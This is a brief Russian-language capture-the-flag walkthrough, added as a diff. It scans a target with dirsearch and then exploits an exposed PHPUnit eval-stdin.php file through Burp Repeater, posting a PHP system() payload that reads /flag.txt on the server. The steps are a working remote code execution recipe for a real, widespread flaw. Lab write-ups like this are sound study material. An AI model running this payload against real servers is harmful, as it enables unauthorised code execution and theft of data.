@@ -1,0 +1,20 @@
+в терминале на кали вводим
+git clone https://github.com/maurosoria/dirsearch.git
+
+дальше
+cd dirsearch
+
+дальше
+./dirsearch.py -u {link} -w ./db/dicc.txt
+
+тут нам нужно /composer.json
+и /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+сначала введем в ссылку {link}/composer.json
+
+дальше 
+{link}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+и эту ссылку закидываем в burpsuit 
+отправляем это в repeater 
+сюда пишем 
+<?php system("cat /flag.txt"); ?>
